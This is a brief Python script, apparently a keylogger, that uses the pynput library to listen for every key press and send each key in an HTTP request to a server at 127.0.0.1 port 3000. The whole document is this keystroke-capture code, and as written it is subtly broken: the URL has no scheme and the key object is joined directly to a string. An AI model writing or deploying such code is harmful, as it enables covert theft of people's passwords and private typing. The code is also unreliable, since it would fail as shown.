from pynput.keyboard import Key, Listener
import requests

def on_press(key):
    requests.get("127.0.0.1:3000/key/" + key)

with Listener(on_press=on_press) as listener :
    listener.join()